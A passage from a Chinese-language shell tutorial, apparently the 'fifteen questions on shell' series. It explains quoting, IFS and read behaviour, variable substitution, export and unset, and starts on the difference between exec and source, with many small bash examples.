class="bash">A</span></span><br></pre></td></tr></table></figure></p><p>在第一个<code>echo</code>命令行中，<code>$</code>被置于soft quote中，将不被关闭，因此继续处理变量替换，因此，<code>echo</code>将A的变量值输出到屏幕，也就是<code>B C</code>的结果。</p><p>在第二个<code>echo</code>命令行中，<code>$</code>被置于hard quote中，则被关闭，因此，<code>$</code>只是一个<code>$</code>符号，并不会用来做变量替换处理，因此结果是<code>$</code>符号后面接一个<code>A</code>字母：<code>$A</code>。</p><p><strong>练习与思考:</strong><br>如下结果为何不同？</p><blockquote><p>tips: 单引号和双引号，在quoting中均被关闭了。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> A=B\ C</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">'"$A"'</span>  <span class="comment">#最外面的是单引号</span></span></span><br><span class="line">"$A"</span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"'<span class="variable">$A</span>'"</span>  <span class="comment">#最外面的是双引号</span></span></span><br><span class="line">'B C'</span><br></pre></td></tr></table></figure><p>比方说，若我们在<code>awk</code>或<code>sed</code>的命令参数中，调用之前设定的一些变量时，常会问及为何不能的问题。</p><p>要解决这些问题，关键点就是：<strong>区分出 shell meta 与 command meta</strong></p><p>前面我们提到的那些meta，都是在command line中有特殊用途的，比方说<code>{}</code>就是将一系列的command line置于不具名的函数中执行(可简单视为command block)。<br>但是，<code>awk</code>却需要用<code>{}</code>来区分出<code>awk</code>的命令<code>区段</code>(<code>BEGIN,MAIN,END</code>)。<br>若你在command line中如此输入：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> awk &#123;<span class="built_in">print</span> <span class="variable">$0</span>&#125; 1.txt</span></span><br></pre></td></tr></table></figure></p><p>由于<code>{}</code>在<code>shell</code>中并没有关闭，那<code>shell</code>就将<code>{print $0}</code>视为command block，但同时没有<code>;</code>符号作命令分隔，因此，就出现awk语法错误结果。</p><p>要解决之，可用hard quote:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk '&#123;print $0&#125;' 1.txt</span><br></pre></td></tr></table></figure></p><p>上面的hard quote应好理解，就是将原来的<code>{、&lt;space&gt;、$、}</code>这几个shell meta关闭，避免掉在<code>shell</code>中遭到处理，而完整的成为<code>awk</code>的参数中command meta。</p><blockquote><p><strong>Note:</strong></p></blockquote><blockquote><p><code>awk</code>中使用的<code>$0</code>是<code>awk</code>中内建的field nubmer，而非<code>awk</code>的变量，<code>awk</code>自身的变量无需使用$。</p></blockquote><p>要是理解了hard quote的功能，在来理解soft quote与escape就不难：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">awk "&#123;print \$0&#125;" 1.txt</span><br><span class="line">awk \&#123;print \$0\&#125; 1.txt</span><br></pre></td></tr></table></figure></p><p>然而，若要你改变<code>awk</code>的<code>$0</code>的<code>0</code>值是从另一个<code>shell</code>变量中读进呢？<br>比方说：已有变量<code>$A</code>的值是<code>0</code>， 那如何在<code>command line</code>中解决awk的$$A呢？<br>你可以很直接否定掉hard quote的方案：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> awk <span class="string">'&#123;print $$A&#125;'</span> 1.txt</span></span><br></pre></td></tr></table></figure></p><p>那是因为<code>$A</code>的<code>$</code>在hard quote中是不能替换变量的。</p><p>聪明的读者(如你！)，经过本章的学习，我想，你应该可以理解为何我们可以使用如下操作了吧：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A=0</span><br><span class="line">awk "&#123;print \$$A&#125;" 1.txt</span><br><span class="line">awk  \&#123;print\ \$$A\&#125; 1.txt</span><br><span class="line">awk '&#123;print $'$A'&#125;' 1.txt</span><br><span class="line">awk '&#123;print $'"$A"'&#125;' 1.txt</span><br></pre></td></tr></table></figure></p><p>或许，你能给出更多方案… ^_^</p><p>一个关于read命令的小问题：<br>很早以前觉得很奇怪：执行read命令，然后读取用户输入给变量赋值，但如果输入是以空格键开始的话，这空格会被忽略，比如：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">read a  #输入：    abc</span><br><span class="line">echo "$a" #只输出abc</span><br></pre></td></tr></table></figure></p><p>原因:<br>    变量a的值，从终端输入的值是以IFS开头，而这些IFS将被shell解释器忽略(trim)。<br>    应该与shell解释器分词的规则有关；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">read a  #输入：\ \ \ abc</span><br><span class="line">echo "$a" #只输出abc</span><br></pre></td></tr></table></figure><p>需要将空格字符转义</p><blockquote><p><strong>Note:</strong> </p></blockquote><blockquote><p> IFS   Internal field separators, normally  space,  tab,  and newline (see Blank Interpretation section).<br> ……<br> Blank Interpretation<br>  After parameter and command  substitution,  the  results  of substitution<br>  are scanned for internal field separator characters (those found in IFS)<br>  and split  into  distinct  arguments  where  such characters are found.<br>  Explicit null arguments (“” or  ‘’)  are  retained.<br>  Implicit  null  arguments(those  resulting  from  parameters that have no values)<br>  are removed.<br>  (refre to: man sh)</p></blockquote><p>解决思路：</p><ol><li>shell command line 主要是将整行line给分解(break down)为每一个单词(word);</li><li>而词与词之间的分隔符就是IFS (Internal Field Seperator)。</li><li>shell会对command line作处理(如替换，quoting等), 然后再按词重组。(注：别忘了这个重组特性)</li><li>当你用IFS来事开头一个变量值，那shell会先整理出这个词，然后在重组command line。</li><li>然而，你将IFS换成其他，那shell将视你哪些space/tab为“词”，而不是IFS。那在重组时，可以得到这些词。</li></ol><p>若你还是不理解，那来验证一下下面这个例子：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> A=<span class="string">"  abc"</span> </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$A</span></span></span><br><span class="line">abc</span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"<span class="variable">$A</span>"</span> <span class="comment">#note1</span></span></span><br><span class="line">   abc</span><br><span class="line"><span class="meta">$</span><span class="bash"> old_IFS=<span class="variable">$IFS</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> IFS=;</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$A</span></span></span><br><span class="line">   abc</span><br><span class="line"><span class="meta">$</span><span class="bash"> IFS=<span class="variable">$old_IFS</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$A</span></span></span><br><span class="line">abc</span><br></pre></td></tr></table></figure></p><blockquote><p><strong>Note:</strong></p></blockquote><blockquote><ol><li>这里是用 soft quoting 将里面的 space 关闭，使之不是 meta(IFS)，而是一个literal(white space);</li><li>IFS=<code>;</code> 意义是将IFS设置为空字符，因为<code>;</code>是shell的元字符(meta);</li></ol></blockquote><p>问题二：为什么多做了几个分号，我想知道为什么会出现空格呢？<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> a=<span class="string">";;;test"</span>                              </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> IFS=<span class="string">";"</span>                                  </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$a</span>                                  </span></span><br><span class="line">   test                                                                         </span><br><span class="line"><span class="meta">$</span><span class="bash"> a=<span class="string">"   test"</span>                              </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$a</span>                                  </span></span><br><span class="line">   test                                                                         </span><br><span class="line"><span class="meta">$</span><span class="bash"> IFS=<span class="string">" "</span>                                  </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$a</span>                                  </span></span><br><span class="line">test</span><br></pre></td></tr></table></figure></p><p>解答：</p><p>这个问题，出在<code>IFS=;</code>上。<br>因为这个<code>;</code>在问题一中的command line上是一个meta,并非<code>&quot;;&quot;</code>符号本身。<br>因此，<code>IFS=;</code>是将IFS设置为 null charactor(不是space、tab、newline)。</p><p>要不是试试下面这个代码片段：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> old_IFS=<span class="variable">$IFS</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">read</span> A</span></span><br><span class="line">;a;b;c</span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$A</span></span></span><br><span class="line">;a;b;c</span><br><span class="line"><span class="meta">$</span><span class="bash"> IFS=<span class="string">";"</span>  <span class="comment">#Note2</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$A</span></span></span><br><span class="line">a b c</span><br></pre></td></tr></table></figure></p><blockquote><p><strong>Note:</strong></p></blockquote><blockquote><p>要关闭<code>;</code>可用<code>&quot;;&quot;</code>或者<code>&#39;;&#39;</code>或者<code>\;</code>。</p></blockquote><p>思考问题二：文本处理：读文件时，如何保证原汁原味。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat file | <span class="keyword">while</span> <span class="built_in">read</span> i</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></p><p>文件file的行中包含若干空，经过<code>read</code>只保留不重复的空格。<br>如何才能所见即所得。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat file | <span class="keyword">while</span> <span class="built_in">read</span> i</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">"X<span class="variable">$&#123;i&#125;</span>X"</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>从上面的输出，可以看出read，读入是按整行读入的，不能原汁原味的原因：</p><blockquote><ol><li>如果行的起始部分有IFS之类的字符，将被忽略;</li><li><code>echo $i</code>的解析过程中，首先将<code>$i</code>替换为字符串，然后对<code>echo</code>字符串中字符串分词，然后命令重组，输出结果;在分词，与命令重组时，可能导致多个相邻的IFS转化为一个;</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat file | <span class="keyword">while</span> <span class="built_in">read</span> i</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"<span class="variable">$i</span>"</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>以上代码可以解决原因2中的，command line的分词和重组导致meta字符丢失；但仍然解决不了原因1中<code>read</code>读取行时，忽略行起始的IFS meta字符。</p><p>回过头来看上面这个问题：为何要原汁原味呢？<br><code>cat</code>命令就是原汁原味的，只是<code>shell</code>的<code>read</code>、<code>echo</code>导致了某些<code>shell</code>的meta字符丢失;</p><p>如果只是IFS meta的丢失，可以采用如下方式：<br>将IFS设置为null，即<code>IFS=;</code>, 在此再次重申此处<code>;</code>是shell的meta字符，而不是literal字符;<br>因此要使用literal的<code>;</code>应该是<code>\;</code>或者关闭meta 的(soft/hard) quoting的<code>&quot;;&quot;</code>或者<code>&#39;;&#39;</code>。</p><p>因此上述的解决方案是：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">old_IFS=<span class="variable">$IFS</span></span><br><span class="line">IFS=; <span class="comment">#将IFS设置为null</span></span><br><span class="line">cat file | <span class="keyword">while</span> <span class="built_in">read</span> i</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"<span class="variable">$i</span>"</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">IFS=old_IFS <span class="comment">#恢复IFS的原始值</span></span><br></pre></td></tr></table></figure></p><p>现在，回过头来看这个问题，为什么会有这个问题呢；其本源的问题应该是没有找到解决原始问题的最合适的方法，而是采取了一个迂回的方式来解决了问题；</p><p>因此，我们应该回到问题的本源，重新审视一下，问题的本质。如果要精准的获取文件的内容，应该使用od或者hexdump会更好些。</p><h2 id="shell十五问之5-问var-value-在export前后的差在哪"><a href="#shell十五问之5-问var-value-在export前后的差在哪" class="headerlink" title="shell十五问之5:问var=value 在export前后的差在哪?"></a>shell十五问之5:问var=value 在export前后的差在哪?</h2><hr><p>这次让我们暂时丢开<code>command line</code>, 先了解一下bash变量(variable)吧。</p><p>所谓的变量，就是利用一个固定的<code>名称(name)</code>,来存取一段可以变化的<code>值(value)</code>。</p><h3 id="1-变量设定-set"><a href="#1-变量设定-set" class="headerlink" title="1. 变量设定(set)"></a>1. 变量设定(set)</h3><p>在<code>bash</code>中， 你可以用<code>=</code>来设定或者重新定义变量的内容：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=value</span><br></pre></td></tr></table></figure></p><p>在设定变量的时候，得遵守如下规则：</p><ul><li>等号左右两边不能使用分隔符号(IFS),也应避免使用shell的保留元字符(meta charactor); </li><li>变量的名称(name)不能使用$符号;</li><li>变量的名称(name)的首字符不能是数字(number)。</li><li>变量的名称(name)的长度不可超过256个字符。</li><li>变量的名称(name)及变量的值的大小写是有区别的、敏感的(case sensitive，) </li></ul><p>如下是一些变量设定时常见的错误：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A= B #=号前后不能有IFS</span><br><span class="line">1A=B #变量名称不能以数字开头</span><br><span class="line"><span class="meta">$</span><span class="bash">A=B <span class="comment">#变量的名称里有$</span></span></span><br><span class="line">a=B  #这跟a=b是不同的,(这不是错误，提醒windows用户)</span><br></pre></td></tr></table></figure></p><p>如下则是可以接受的设定：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A=" B" #IFS被关闭，参考前面的quoting章节</span><br><span class="line">A1=B   #并非以数字开头</span><br><span class="line">A=$B   #$可用在变量的值内</span><br><span class="line">This_Is_A_Long_Name=b #可用_连接较长的名称或值，且有大小区别；</span><br></pre></td></tr></table></figure></p><h3 id="2-变量替换-substitution"><a href="#2-变量替换-substitution" class="headerlink" title="2. 变量替换(substitution)"></a>2. 变量替换(substitution)</h3><p><code>shell</code>之所以强大，其中的一个因素是它可以在命令行中对变量作<code>替换</code>(<code>substitution</code>)处理。<br>在命令行中使用者可以使用<code>$</code>符号加上变量名称(除了用<code>=</code>定义变量名称之外)，<br>将变量值给替换出来，然后再重新组建命令行。</p><p>比方:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ A=ls</span><br><span class="line">$ B=la</span><br><span class="line">$ C=/tmp</span><br><span class="line">$ <span class="variable">$A</span> -<span class="variable">$B</span> <span class="variable">$C</span></span><br></pre></td></tr></table></figure></p><p>以上命令行的第一个<code>$</code>是<code>shell prompt</code>, 并不在命令行之内。<br>必须强调的是，我们所提的变量替换，只发生在command line上面。<br><strong>是的，请让我们再次回到命令行吧！</strong><br>仔细分析,最后那行command line,不难发现在被执行前(在输入<code>CR</code>字符之前)，<code>$</code>符号对每一个变量作替换处理(将变量的值替换出来再重组命令行),<br>最后会得出如下结果：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la /tmp</span><br></pre></td></tr></table></figure></p><p>还记得第二章，我请大家<strong>务必理解</strong>的那两句吗？<br>若你忘了，我这里重贴一遍：</p><blockquote><p><strong>Note:</strong></p></blockquote><blockquote><p>若从技术的细节来看，<code>shell</code>会依据<code>IFS</code>(<code>Internal Field Seperator</code>)<br>将command line所输入的文字拆解为字段(word/field)。<br>然后再针对特殊字符(meta)先作处理，最后重组整行command line。</p></blockquote><p>这里的<code>$</code>就是command line中最经典的meta之一了，就是作变量替换的。<br>在日常的shell操作中，我们常会使用<code>echo</code>命令来查看特定的变量的值。<br>例如：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$A</span> -<span class="variable">$B</span> <span class="variable">$C</span></span></span><br></pre></td></tr></table></figure></p><p>我们已学过，<code>echo</code>命令只单纯将其argument送至标准输出(stdout, 通常是我们的屏幕)。<br>所以上面的命令会在屏幕上得到如下结果：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al /tmp</span><br></pre></td></tr></table></figure></p><p>这是由于<code>echo</code>命令在执行时，会先将<code>$A</code> (ls)、<code>$B</code> (la)跟<code>$C</code> (/tmp)给替换出来；利用shell对变量的替换处理能力，我们在设定变量时就更为灵活了：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A=B</span><br><span class="line">B=$A</span><br></pre></td></tr></table></figure></p><p>这样，B的变量值就可继承A变量<strong>当时</strong>的变量值了。<br>不过，不要以<strong>数学逻辑</strong>来套用变量的设定，比方说：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A=B</span><br><span class="line">B=C</span><br></pre></td></tr></table></figure></p><p>这样，并不会让A的变量值变成C。再如：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A=B</span><br><span class="line">B=$A</span><br><span class="line">A=C</span><br></pre></td></tr></table></figure></p><p>同样也不会让B的值变成C。</p><p>上面是单纯定义了两个不同名称的变量：<br>A 与 B, 它们的取值分别是C与B。</p><p>若变量被重复定义的话，则原有旧值将被新值所取代。(这不正是可变的量吗？^_^)<br>当我们在设定变量的时候，请记住这点：<strong>用一个名称存储一个数值</strong>， 仅此而已。</p><p>此外， 我们也可以利用命令行的变量替换能力来<code>扩充</code>(<code>append</code>)变量的值：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A=B:C:D</span><br><span class="line">A=$A:E</span><br></pre></td></tr></table></figure></p><p>这样， 第一行我们设定A的值为<code>B:C:D</code>,<br>然后,第二行再将值扩充为<code>B:C:D:E</code>。</p><p>上面的扩充的范例，我们使用分隔符号(:)来达到扩充的目的，要是没有分隔符的话，如下是有问题的：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A=BCD</span><br><span class="line">B=$AE</span><br></pre></td></tr></table></figure></p><p>因为第二次是将A的值继承$AE的替换结果，而非$A再加E。<br>要解决此问题，我们可用更严谨的替换处理：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A=BCD</span><br><span class="line">A=$&#123;A&#125;E</span><br></pre></td></tr></table></figure></p><p>上例中，我们使用<code>{}</code>将变量名称范围给明确定义出来，如此一来，我们就可以将A的变量值从BCD给扩充为BCDE。</p><blockquote><p><strong>Tips:</strong><br>关于${name}事实上还可以做到更多的变量处理能力，这些均属于比较进阶阶段的变量处理，现阶段暂不介绍了，请大家自行参考资料。</p></blockquote><h3 id="3-export-变量"><a href="#3-export-变量" class="headerlink" title="3. export 变量"></a>3. export 变量</h3><p>严格来说，我们在当前shell中所定义的变量，均属于<strong>本地变量(local variable)</strong>, 只有经过<code>export</code>命令的<strong>输出处理</strong>，才能成为<strong>环境变量(environment variable)</strong>：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> A=B</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">export</span> A</span></span><br></pre></td></tr></table></figure></p><p>或者<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">export</span> A=B</span></span><br></pre></td></tr></table></figure></p><p>经过<code>export</code>输出处理之后，变量A就能成为一个环境变量供其后的命令使用。在使用<code>export</code>的时候，请别忘记shell在命令行对变量的<strong>替换(substitution)处理</strong>。<br>比方说：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> A=B</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> B=C</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">export</span> <span class="variable">$A</span></span></span><br></pre></td></tr></table></figure></p><p>上面的命令并未将A输出为<strong>环境变量</strong>，而是将B导出。<br>这是因为在这个命令行中，$A会首先被替换为B,然后在塞回作<code>export</code>的参数。</p><p>要理解这个<code>export</code>，事实上需要从<code>process</code>(<code>进程</code>)的角度来理解才能透彻。<br>我们将于下一章为大家说明<code>process</code>(<code>进程</code>)的概念，敬请留意。</p><h4 id="4-取消变量-unset"><a href="#4-取消变量-unset" class="headerlink" title="4. 取消变量(unset)"></a>4. 取消变量(unset)</h4><p>要取消一个变量，在bash中可使用<code>unset</code>命令来处理：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unset A</span><br></pre></td></tr></table></figure></p><p>与<code>export</code>一样，<code>unset</code>命令行，也同样会作变量替换(这其实是shell的功能之一)，因此:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> A=B</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> B=C</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">unset</span> <span class="variable">$A</span></span></span><br></pre></td></tr></table></figure></p><p>事实上，所取消的是变量B而不是A。</p><p>此外，变量一旦经过<code>unset</code>取消之后，其结果是将整个变量拿掉，而不是取消变量的值。</p><p>如下两行其实是很不一样的：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> A=</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">unset</span> A</span></span><br></pre></td></tr></table></figure></p><p>第一行只是将变量A设定为<strong>空值(null value)</strong>,但第二行则是让变量A不存在。<br>虽然用眼睛来看，这两种变量的状态在如下的命令结果中都是一样的：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> A=</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$A</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">unset</span> A</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$A</span></span></span><br></pre></td></tr></table></figure></p><p>请你务必能识别<code>null value</code>与<code>unset</code>的本质区别，这在一些进阶的变量处理上是很严格的。</p><p>比方说：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> str=    <span class="comment">#设为null</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> var=<span class="variable">$&#123;str=expr&#125;</span> <span class="comment">#定义var</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$var</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$str</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">unset</span> str <span class="comment">#取消str</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> var=<span class="variable">$&#123;str=expr&#125;</span> <span class="comment">#定义var</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$var</span></span></span><br><span class="line">expr</span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$str</span></span></span><br><span class="line">expr</span><br></pre></td></tr></table></figure></p><p>聪明的读者(yes, you!)，稍加思考的话，应该不难发现为何同样的<code>var=${str=expr}</code>在<code>str</code>为<code>null</code>与<code>unset</code>之下的不同吧？<br>若你看不出来，那可能是如下原因之一：</p><ul><li>你太笨了</li><li>不了解 var=${str=expr} 这个进阶处理</li><li>对本篇说明还没有来得及消化吸收</li><li>我讲得不好</li></ul><p>不知，您选哪个呢?</p><h2 id="shell十五问之6：exec跟source差在哪？"><a href="#shell十五问之6：exec跟source差在哪？" class="headerlink" title="shell十五问之6：exec跟source差在哪？"></a>shell十五问之6：exec跟source差在哪？</h2><hr><blockquote><p><strong>提问:</strong></p></blockquote><blockquote><p>执行命令<code>cd /etc/aa/bb/cc</code>可以执行并移动到<code>/etc/aa/bb/cc</code>目录，但是把这条命令放入<code>shell脚本</code>执行,却没移动<code>/etc/aa/bb/cc</code>目录！<br>这是什么原因？</p></blockquote><p>我当时如何回答暂时别去深究，先让我们了解一下<code>进程</code>(<code>process</code>)的概念好了。</p><p>首先，我们所执行的任何程序，都是<code>父进程</code>(<code>parent process</code>)产生的一个<code>子进程</code>(<code>child process</code>),子进程在结束后，将返回到父进程去。</p><p>此现象在<code>Linux</code>中被称为<code>fork</code>。</p><p>(为何要称为fork呢？ 嗯，画一下图或许比较好理解。^_^)<br><img src="https://linux7788.com/images/posts/shell_fork.jpg" alt="image"></p><p>当子进程被产生的时候，将会从父进程那里获得一定的资源分配、及<strong>更重要的是</strong>继承父进程的环境。</p><p>让我们回到上一章所谈到的环境变量吧：</p><blockquote><p>所谓环境变量其实就是那些会传给子进程的变量。<br>简单而言, 遗传性就是区分本地变量与环境变量的决定性指标。然而，从遗传的角度来看，我们不难发现环境变量的另一个重要特征：<br><strong>环境变量只能从父进程到子进程单向传递。换句话说：在子进程中环境如何变更，均不会影响父进程的环境。</strong></p></blockquote><p>接下来，在让我们了解一下<code>shell脚本</code>(<code>shell script</code>)的概念。<br>所谓<code>shell script</code>讲起来很简单，就是将你平时在shell prompt输入的多行command line, 依序输入到一个文件文件而已。</p><p>再结合以上两个概念(process + script)，那应该不难理解如下的这句话的意思了：</p><blockquote><p>正常来说，当我们执行一个<code>shell script</code>时，其实是先产生一个<code>sub-shell</code>的子进程，然后<code>sub-shell</code>再去产生命令行的子进程。</p></blockquote><p>现在让我们回到本章开始时所提到的例子再从新思考：</p><blockquote><p><strong>提问:</strong></p></blockquote><blockquote><p>执行命令<code>cd /etc/aa/bb/cc</code>可以执行并移动到<code>/etc/aa/bb/cc</code>目录，但是把这条命令放入<code>shell脚本</code>执行,却没移动<code>/etc/aa/bb/cc</code>目录！<br>这是什么原因？</p></blockquote><p>我当时的答案是这样的：</p><blockquote><p>因为，我们一般跑的<code>shell 